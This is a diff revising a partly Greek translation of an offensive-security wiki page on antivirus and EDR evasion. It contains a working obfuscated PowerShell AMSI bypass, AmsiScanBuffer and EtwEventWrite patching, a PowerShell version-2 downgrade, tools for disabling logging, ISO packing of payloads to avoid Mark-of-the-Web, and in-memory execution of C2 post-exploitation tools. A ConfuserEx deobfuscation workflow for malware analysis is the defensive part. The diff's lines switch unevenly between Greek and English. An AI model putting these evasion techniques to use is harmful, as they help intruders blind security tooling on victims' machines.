-Απαιτήθηκε μόνο μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για τη τρέχουσα διαδικασία powershell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση προκειμένου να χρησιμοποιηθεί αυτή η τεχνική.
+Αρκούσε μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διεργασία του powershell. Αυτή η γραμμή έχει, φυσικά, επισημανθεί από το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.
 
-Εδώ είναι μια τροποποιημένη παράκαμψη AMSI που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
+Ακολουθεί ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
 ```bash
 Try{#Ams1 bypass technic nº 2
 $Xdatabase = 'Utils';$Homedrive = 'si'
@@ -187,77 +189,78 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.
+Λάβετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, οπότε δεν θα πρέπει να δημοσιεύσετε κανένα code αν το σχέδιό σας είναι να παραμείνετε απαρατήρητοι.
 
 **Memory Patching**
 
-Αυτή η τεχνική ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης για τη λειτουργία "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για την σάρωση της εισόδου που παρέχεται από τον χρήστη) και την αντικατάστασή της με οδηγίες για να επιστρέψει τον κωδικό E_INVALIDARG, με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.
+This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.
 
 > [!TIP]
-> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.
+> Διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.
 
-Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για να παρακάμψουν το AMSI με το powershell, ρίξτε μια ματιά [**σε αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**σε αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.
+There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
 
-Αυτό το εργαλείο [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) δημιουργεί επίσης σενάριο για να παρακάμψει το AMSI.
+This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.
 
 **Remove the detected signature**
 
-Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευθείσα υπογραφή AMSI από τη μνήμη της τρέχουσας διαδικασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διαδικασίας για την υπογραφή AMSI και στη συνέχεια την αντικαθιστά με οδηγίες NOP, αφαιρώντας την αποτελεσματικά από τη μνήμη.
+Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και στη συνέχεια την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.
 
 **AV/EDR products that uses AMSI**
 
-Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν το AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
+Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
 
 **Use Powershell version 2**
-Αν χρησιμοποιείτε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα σενάριά σας χωρίς να σαρωθείτε από το AMSI. Μπορείτε να το κάνετε αυτό:
+If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
 ```bash
 powershell.exe -version 2
 ```
 ## PS Logging
 
-Η καταγραφή PowerShell είναι μια δυνατότητα που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να είναι ένα **πρόβλημα για τους επιτιθέμενους που θέλουν να αποφύγουν την ανίχνευση**.
+PowerShell logging είναι μια δυνατότητα που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελέσει ένα **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν την ανίχνευση**.
 
-Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:
+Για να παρακάμψετε το PowerShell logging, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:
 
-- **Απενεργοποίηση της καταγραφής μεταγραφής και μονάδας PowerShell**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτό το σκοπό.
-- **Χρήση της έκδοσης 2 του PowerShell**: Εάν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα σενάριά σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε αυτό: `powershell.exe -version 2`
-- **Χρήση μιας μη διαχειριζόμενης συνεδρίας PowerShell**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να δημιουργήσετε ένα PowerShell χωρίς άμυνες (αυτό είναι που χρησιμοποιεί το `powerpick` από το Cobalt Strike).
+- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
+- **Use Powershell version 2**: Αν χρησιμοποιήσετε το PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να τρέξετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
+- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να ξεκινήσετε μια powershell χωρίς άμυνες (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobal Strike).
+
 
 ## Obfuscation
 
 > [!TIP]
-> Πολλές τεχνικές παραπλάνησης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία θα αυξήσει την εντροπία του δυαδικού αρχείου, διευκολύνοντας έτσι την ανίχνευσή του από τα AVs και EDRs. Να είστε προσεκτικοί με αυτό και ίσως να εφαρμόσετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή χρειάζονται απόκρυψη.
+> Several obfuscation techniques βασίζονται στην κρυπτογράφηση δεδομένων, η οποία θα αυξήσει την εντροπία του binary και θα διευκολύνει τα AVs και EDRs να το εντοπίσουν. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόστε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να κρυφτούν.
 
 ### Deobfuscating ConfuserEx-Protected .NET Binaries
 
-Όταν αναλύετε κακόβουλο λογισμικό που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να αντιμετωπίζετε πολλές στρώσεις προστασίας που θα μπλοκάρουν τους αποσυμπιεστές και τις sandbox. Η ροή εργασίας παρακάτω αποκαθιστά αξιόπιστα **μια σχεδόν-αρχική IL** που μπορεί στη συνέχεια να αποσυμπιεστεί σε C# σε εργαλεία όπως το dnSpy ή ILSpy.
+Κατά την ανάλυση malware που χρησιμοποιεί ConfuserEx 2 (ή εμπορικά forks) είναι σύνηθες να αντιμετωπίζετε πολλαπλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes. Το παρακάτω workflow επαναφέρει με αξιοπιστία ένα **σχεδόν αυθεντικό IL** που μπορεί στη συνέχεια να αποδιαμορφωθεί σε C# σε εργαλεία όπως dnSpy ή ILSpy.
 
-1.  Αφαίρεση αντι-παρεμβολής – Το ConfuserEx κρυπτογραφεί κάθε *σώμα μεθόδου* και το αποκρυπτογραφεί μέσα στον *στατικό κατασκευαστή* του *module* (`<Module>.cctor`). Αυτό επίσης διορθώνει το PE checksum, οπότε οποιαδήποτε τροποποίηση θα καταρρεύσει το δυαδικό αρχείο. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες μεταδεδομένων, να ανακτήσετε τα κλειδιά XOR και να ξαναγράψετε μια καθαρή συναρμολόγηση:
+1.  Anti-tampering removal – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum, οπότε οποιαδήποτε τροποποίηση θα κάνει το binary να καταρρεύσει. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να γράψετε ένα καθαρό assembly:
 ```bash
 # https://github.com/wwh1004/AntiTamperKiller
 python AntiTamperKiller.py Confused.exe Confused.clean.exe
 ```
-Η έξοδος περιέχει τις 6 παραμέτρους αντι-παρεμβολής (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες κατά την κατασκευή του δικού σας αποσυμπιεστή.
+Το output περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε τον δικό σας unpacker.
 
-2.  Ανάκτηση συμβόλων / ροής ελέγχου – τροφοδοτήστε το *καθαρό* αρχείο στο **de4dot-cex** (ένα fork του de4dot που γνωρίζει το ConfuserEx).
+2.  Symbol / control-flow recovery – τροφοδοτήστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
 ```bash
 de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
 ```
-Σημαίες:
-• `-p crx` – επιλέξτε το προφίλ ConfuserEx 2
-• το de4dot θα αναιρέσει την επίπεδη ροή ελέγχου, θα αποκαταστήσει τα αρχικά namespaces, τις κλάσεις και τα ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.
+Flags:
+• `-p crx` – επιλέγει το ConfuserEx 2 profile  
+• de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.
 
-3.  Αφαίρεση κλήσεων proxy – Το ConfuserEx αντικαθιστά τις άμεσες κλήσεις μεθόδων με ελαφριές περιτυλίξεις (γνωστές και ως *κλήσεις proxy*) για να σπάσει περαιτέρω την αποσυμπίεση. Αφαιρέστε τις με το **ProxyCall-Remover**:
+3.  Proxy-call stripping – Το ConfuserEx αντικαθιστά απευθείας κλήσεις με ελαφριά wrappers (aka *proxy calls*) για να κάνει πιο δύσκολη την decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
 ```bash
 ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
 ```
-Μετά από αυτό το βήμα, θα πρέπει να παρατηρήσετε κανονικά .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς λειτουργίες περιτύλιξης (`Class8.smethod_10`, …).
+Μετά από αυτό το βήμα θα πρέπει να δείτε κανονικά .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper συναρτήσεις (`Class8.smethod_10`, …).
 
-4.  Χειροκίνητος καθαρισμός – εκτελέστε το προκύπτον δυαδικό αρχείο κάτω από το dnSpy, αναζητήστε μεγάλες μπάλες Base64 ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το κακόβουλο λογισμικό το αποθηκεύει ως TLV-κωδικοποιημένο byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.
+4.  Manual clean-up – τρέξτε το προκύπτον binary υπό dnSpy, αναζητήστε μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως ένα TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.
 
-Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε έναν εκτός σύνδεσης σταθμό εργασίας.
+Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να τρέξετε το κακόβουλο δείγμα – χρήσιμο όταν δουλεύετε σε offline workstation.
 
-> 🛈  Το ConfuserEx παράγει ένα προσαρμοσμένο χαρακτηριστικό που ονομάζεται `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη ταξινόμηση δειγμάτων.
+> 🛈  ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη τριαρίσματος δειγμάτων.
 
 #### One-liner
 ```bash
@@ -266,37 +269,37 @@ autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
 ---
 
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει ένα ανοιχτού κώδικα fork της [LLVM](http://www.llvm.org/) σουίτας μεταγλώττισης που είναι ικανή να παρέχει αυξημένη ασφάλεια λογισμικού μέσω [κωδικοποίησης](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραβιάσεις.
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσετε τη γλώσσα `C++11/14` για να δημιουργήσετε, κατά τη διάρκεια της μεταγλώττισης, κωδικοποιημένο κώδικα χωρίς να χρησιμοποιήσετε οποιοδήποτε εξωτερικό εργαλείο και χωρίς να τροποποιήσετε τον μεταγλωττιστή.
-- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει μια στρώση κωδικοποιημένων λειτουργιών που παράγονται από το πλαίσιο μεταπρογραμματισμού C++ template, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να σπάσει την εφαρμογή λίγο πιο δύσκολη.
-- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας κωδικοποιητής δυαδικών αρχείων x64 που είναι ικανός να κωδικοποιεί διάφορα διαφορετικά αρχεία pe, συμπεριλαμβανομένων: .exe, .dll, .sys
-- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός κινητικός κωδικός μηχανής για αυθαίρετους εκτελέσιμους.
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα λεπτομερές πλαίσιο κωδικοποίησης για γλώσσες που υποστηρίζονται από LLVM χρησιμοποιώντας ROP (programming oriented return). Το ROPfuscator κωδικοποιεί ένα πρόγραμμα σε επίπεδο κώδικα συναρμολόγησης μετατρέποντας κανονικές εντολές σε αλυσίδες ROP, αποτρέποντας την φυσική μας αντίληψη της κανονικής ροής ελέγχου.
-- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
-- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor είναι ικανό να μετατρέπει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώνει
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει ένα fork ανοιχτού κώδικα της [LLVM](http://www.llvm.org/) σουίτας μεταγλώττισης, ικανό να αυξήσει την ασφάλεια του λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσετε τη γλώσσα `C++11/14` για να δημιουργήσετε, κατά το compile time, obfuscated code χωρίς να χρησιμοποιήσετε οποιοδήποτε εξωτερικό εργαλείο και χωρίς να τροποποιήσετε τον compiler.
+- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγονται από το πλαίσιο C++ template metaprogramming, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να crack the application λίγο πιο δύσκολη.
+- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα pe αρχεία, συμπεριλαμβανομένων: .exe, .dll, .sys
+- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή metamorphic code engine για arbitrary executables.
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για γλώσσες που υποστηρίζονται από LLVM, χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code μετατρέποντας κανονικές εντολές σε ROP chains, υπονομεύοντας την φυσική μας αντίληψη του normal control flow.
+- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
+- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει
 
 ## SmartScreen & MoTW
 
-Μπορεί να έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια εκτελέσιμα από το διαδίκτυο και τα εκτελείτε.
+Ίσως έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια εκτελέσιμα από το internet και τα εκτελείτε.
 
-Ο Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που προορίζεται να προστατεύσει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.
+Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που στοχεύει στην προστασία του τελικού χρήστη από την εκτέλεση πιθανώς κακόβουλων εφαρμογών.
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-Ο SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη φήμη, πράγμα που σημαίνει ότι οι εφαρμογές που κατεβάζονται σπάνια θα ενεργοποιήσουν τον SmartScreen, προειδοποιώντας και αποτρέποντας τον τελικό χρήστη από την εκτέλεση του αρχείου (αν και το αρχείο μπορεί να εκτελεστεί κάνοντας κλικ στο Περισσότερες Πληροφορίες -> Εκτέλεση ούτως ή άλλως).
+Το SmartScreen δουλεύει κυρίως με μια προσέγγιση βασισμένη στη φήμη, που σημαίνει ότι εφαρμογές με σπάνιες λήψεις θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).
 
-**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier που δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο κατεβάστηκε.
+**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, που δημιουργείται αυτόματα όταν κατεβάζονται αρχεία από το internet, μαζί με το URL από το οποίο κατέβηκαν.
 
-<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατεβάστηκε από το διαδίκτυο.</p></figcaption></figure>
+<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το internet.</p></figcaption></figure>
 
 > [!TIP]
-> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα που υπογράφονται με ένα **έμπιστο** πιστοποιητικό υπογραφής **δεν θα ενεργοποιήσουν τον SmartScreen**.
+> Είναι σημαντικό να σημειωθεί ότι εκτελέσιμα υπογεγραμμένα με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.
 
-Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος κοντέινερ όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε **μη NTFS** τόμους.
+Ένας πολύ αποτελεσματικός τρόπος να εμποδίσετε τα payloads σας να λάβουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε **non NTFS** volumes.
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε κοντέινερ εξόδου για να αποφύγει το Mark-of-the-Web.
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.
 
 Παράδειγμα χρήσης:
 ```bash
@@ -320,132 +323,135 @@ Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-Here is a demo για την παράκαμψη του SmartScreen με την συσκευασία payloads μέσα σε αρχεία ISO χρησιμοποιώντας [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
+Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
 
 <figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
 ## ETW
 
-Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει στις εφαρμογές και τα συστήματα να **καταγράφουν γεγονότα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και ανίχνευση κακόβουλων δραστηριοτήτων.
+Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **log events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για να παρακολουθούν και να ανιχνεύουν κακόβουλες δραστηριότητες.
 
-Παρόμοια με το πώς απενεργοποιείται (παράκαμψη) το AMSI, είναι επίσης δυνατό να κάνετε τη λειτουργία **`EtwEventWrite`** της διαδικασίας χώρου χρήστη να επιστρέφει άμεσα χωρίς να καταγράφει κανένα γεγονός. Αυτό γίνεται με την επιδιόρθωση της λειτουργίας στη μνήμη ώστε να επιστρέφει άμεσα, αποδοτικά απενεργοποιώντας την καταγραφή ETW για αυτή τη διαδικασία.
+Παρόμοια με το πώς απενεργοποιείται (bypassed) το AMSI, είναι επίσης δυνατό να κάνετε τη συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει ακαριαία χωρίς να καταγράφει γεγονότα. Αυτό επιτυγχάνεται κάνοντας patch στη συνάρτηση στη μνήμη ώστε να επιστρέφει αμέσως, ουσιαστικά απενεργοποιώντας την καταγραφή ETW για εκείνη τη διεργασία.
 
-Μπορείτε να βρείτε περισσότερες πληροφορίες στο **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
+Μπορείτε να βρείτε περισσότερες πληροφορίες σε **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
+
 
 ## C# Assembly Reflection
 
-Η φόρτωση C# δυαδικών αρχείων στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και είναι ακόμα ένας πολύ καλός τρόπος για να εκτελείτε τα εργαλεία post-exploitation σας χωρίς να πιαστείτε από το AV.
+Το loading C# binaries στη μνήμη είναι γνωστό εδώ και καιρό και παραμένει ένας πολύ καλός τρόπος για να τρέξετε τα post-exploitation εργαλεία σας χωρίς να εντοπιστείτε από το AV.
 
-Δεδομένου ότι το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα πρέπει να ανησυχούμε μόνο για την επιδιόρθωση του AMSI για ολόκληρη τη διαδικασία.
+Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί μόνο να ασχοληθούμε με το patching του AMSI για ολόκληρη τη διεργασία.
 
-Οι περισσότερες C2 πλατφόρμες (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διάφοροι τρόποι για να το κάνετε αυτό:
+Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) ήδη παρέχουν τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:
 
 - **Fork\&Run**
 
-Αυτό περιλαμβάνει **τη δημιουργία μιας νέας θυσιαστικής διαδικασίας**, την έγχυση του κακόβουλου κώδικα post-exploitation σε αυτή τη νέα διαδικασία, την εκτέλεση του κακόβουλου κώδικα και όταν τελειώσει, την εξόντωση της νέας διαδικασίας. Αυτό έχει τα πλεονεκτήματα και τα μειονεκτήματά του. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση συμβαίνει **εκτός** της διαδικασίας του Beacon implant μας. Αυτό σημαίνει ότι αν κάτι στην ενέργεια post-exploitation μας πάει στραβά ή πιαστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να πιαστείτε από **Behavioral Detections**.
+Αυτό περιλαμβάνει το **spawn ενός νέου sacrificial process**, την injection του post-exploitation malicious code σε εκείνη τη νέα διεργασία, την εκτέλεση του malicious code και όταν τελειώσει, το τερματισμό της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το όφελος της μεθόδου fork and run είναι ότι η εκτέλεση λαμβάνει χώρα **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι αν κάτι στην post-exploitation ενέργειά μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant** μας να επιβιώσει. Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
 - **Inline**
 
